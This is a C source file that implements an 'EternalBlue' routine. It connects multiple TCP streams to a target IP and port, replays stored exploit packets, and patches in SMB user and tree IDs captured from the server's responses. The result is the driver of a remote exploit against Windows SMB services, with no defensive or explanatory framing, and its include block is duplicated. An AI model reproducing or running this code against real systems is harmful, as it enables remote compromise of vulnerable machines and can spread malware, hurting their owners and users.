#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "config.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <limits.h>

int EternalBlue(const char *ip, int port)
{
    SOCKET sockets[NUM_SOCKETS + 1];
    uint8_t userid[2] = {0, 0};
    uint8_t treeid[2] = {0, 0};
    struct sockaddr_in address;
    WSADATA wsa_data;
    size_t i;
    int result = -1;
    int wsa_started = 0;
    static const uint8_t userid_marker[] = "__USERID__PLACEHOLDER__";
    static const uint8_t treeid_marker[] = "__TREEID__PLACEHOLDER__";

    if (ip == NULL || port < 1 || port > 65535)
        return -1;

    for (i = 0; i <= (size_t)NUM_SOCKETS; ++i)
        sockets[i] = INVALID_SOCKET;

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
        return -1;
    wsa_started = 1;

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1)
        goto cleanup;

    for (i = 0; i < (size_t)EB_OPS_COUNT; ++i) {
        const eb_op_t *op = &EB_OPS[i];

        if (op->stream < 1 || op->stream > NUM_SOCKETS)
            goto cleanup;

        switch (op->kind) {
        case 0:
            if (sockets[op->stream] != INVALID_SOCKET)
                goto cleanup;
            sockets[op->stream] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sockets[op->stream] == INVALID_SOCKET)
                goto cleanup;
            printf("EternalBlue: connecting stream %u\n", (unsigned)op->stream);
            if (connect(sockets[op->stream], (const struct sockaddr *)&address,
                        (int)sizeof(address)) == SOCKET_ERROR)
                goto cleanup;
            break;

        case 1: {
            size_t input_length = (size_t)op->length;
            size_t packet_size = sizeof(EB_PACKETS);
            size_t in_pos = 0;
            size_t out_pos = 0;
            uint8_t *output;

            if (sockets[op->stream] == INVALID_SOCKET ||
                (size_t)op->offset > packet_size ||
                input_length > packet_size - (size_t)op->offset ||
                input_length > (size_t)INT_MAX)
                goto cleanup;

            output = (uint8_t *)malloc(input_length != 0 ? input_length : 1);
            if (output == NULL)
                goto cleanup;

            while (in_pos < input_length) {
                size_t remaining = input_length - in_pos;
                const uint8_t *source = EB_PACKETS + (size_t)op->offset + in_pos;

                if (remaining >= sizeof(userid_marker) - 1 &&
                    memcmp(source, userid_marker, sizeof(userid_marker) - 1) == 0) {
                    output[out_pos++] = userid[0];
                    output[out_pos++] = userid[1];
                    in_pos += sizeof(userid_marker) - 1;
                } else if (remaining >= sizeof(treeid_marker) - 1 &&
                           memcmp(source, treeid_marker, sizeof(treeid_marker) - 1) == 0) {
                    output[out_pos++] = treeid[0];
                    output[out_pos++] = treeid[1];
                    in_pos += sizeof(treeid_marker) - 1;
                } else {
                    output[out_pos++] = *source;
                    ++in_pos;
                }
            }

            printf("EternalBlue: sending %u bytes on stream %u\n",
                   (unsigned)out_pos, (unsigned)op->stream);
            {
                size_t sent = 0;
                while (sent < out_pos) {
                    int chunk = (out_pos - sent > (size_t)INT_MAX)
                                    ? INT_MAX
                                    : (int)(out_pos - sent);
                    int count = send(sockets[op->stream],
                                     (const char *)output + sent, chunk, 0);
                    if (count == SOCKET_ERROR || count == 0) {
                        free(output);
                        goto cleanup;
                    }
                    sent += (size_t)count;
                }
            }
            free(output);
            break;
        }

        case 2: {
            uint8_t response[4096];
            int count;

            if (sockets[op->stream] == INVALID_SOCKET)
                goto cleanup;

            printf("EternalBlue: receiving on stream %u\n", (unsigned)op->stream);
            count = recv(sockets[op->stream], (char *)response,
                         (int)sizeof(response), 0);
            if (count == SOCKET_ERROR || count == 0)
                goto cleanup;

            if (op->fix == 1) {
                if (count < 34)
                    goto cleanup;
                userid[0] = response[32];
                userid[1] = response[33];
            } else if (op->fix == 2) {
                if (count < 30)
                    goto cleanup;
                treeid[0] = response[28];
                treeid[1] = response[29];
            }

            break;
        }

        case 3:
            if (sockets[op->stream] == INVALID_SOCKET)
                goto cleanup;
            printf("EternalBlue: closing stream %u\n", (unsigned)op->stream);
            if (closesocket(sockets[op->stream]) == SOCKET_ERROR)
                goto cleanup;
            sockets[op->stream] = INVALID_SOCKET;
            break;

        default:
            goto cleanup;
        }
    }

    result = 0;

cleanup:
    for (i = 1; i <= (size_t)NUM_SOCKETS; ++i) {
        if (sockets[i] != INVALID_SOCKET)
            closesocket(sockets[i]);
    }
    if (wsa_started)
        WSACleanup();
    return result;
}